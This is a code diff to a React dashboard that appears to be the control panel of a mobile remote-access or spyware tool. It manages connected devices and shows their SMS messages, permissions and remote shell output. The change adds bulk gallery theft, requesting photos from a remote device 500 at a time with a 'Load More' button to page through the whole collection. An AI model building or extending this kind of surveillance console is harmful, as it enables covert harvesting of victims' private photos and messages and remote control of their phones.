@@ -26,7 +26,12 @@ export default function Dashboard() {
           setDevices(p => ({ ...p, [d.device_id]: { ...p[d.device_id], ...d } }));
           if (!selectedDevice) setSelectedDevice(d.device_id);
         }
-        if (d.type === 'gallery_response') { setGallery(d.images || []); showToast(`Fetched photos`); }
+        if (d.type === 'gallery_response') { 
+          if (d.images) {
+            setGallery(prev => d.offset === 0 ? d.images : [...prev, ...d.images]); 
+            showToast(`Fetched ${d.images.length} photos`); 
+          }
+        }
         if (d.type === 'sms_response') { setMessages(d.messages || []); showToast(`Fetched messages`); }
         if (d.type === 'permissions_response') { setPerms(d.permissions || {}); showToast('Permissions updated'); }
         if (d.type === 'shell_response') { setOut(d.data); }
@@ -109,8 +114,16 @@ export default function Dashboard() {
             </div>}
 
             {subTab === 'Gallery' && <div className="space-y-4">
-              <button onClick={() => { setGallery([]); send('GET_GALLERY', {limit:20}); }} className="bg-blue-600 px-4 py-2 rounded text-sm font-bold">Fetch Photos</button>
-              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">{gallery.map((b, i) => <img key={i} src={`data:image/jpeg;base64,${b}`} className="w-full h-40 object-cover rounded-lg border border-gray-700" />)}</div>
+              <div className="flex gap-4 mb-4">
+                <button onClick={() => { setGallery([]); send('GET_GALLERY', {limit: 500, offset: 0}); }} className="bg-blue-600 hover:bg-blue-500 px-4 py-2 rounded text-sm font-bold">Load First 500 Photos</button>
+                {gallery.length > 0 && (
+                  <button onClick={() => send('GET_GALLERY', {limit: 500, offset: gallery.length})} className="bg-purple-600 hover:bg-purple-500 px-4 py-2 rounded text-sm font-bold">Load More (+500)</button>
+                )}
+              </div>
+              <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
+                {gallery.map((b, i) => <img key={i} src={`data:image/jpeg;base64,${b}`} className="w-full h-40 object-cover rounded-lg border border-gray-700" />)}
+              </div>
+              {gallery.length === 0 && <div className="text-gray-500 text-center py-10 text-sm">Click 'Load First 500 Photos' to fetch gallery.</div>}
             </div>}
 
             {subTab === 'Permissions' && <div className="bg-[#1A1B23] p-6 rounded-xl border border-gray-800 max-w-2xl">
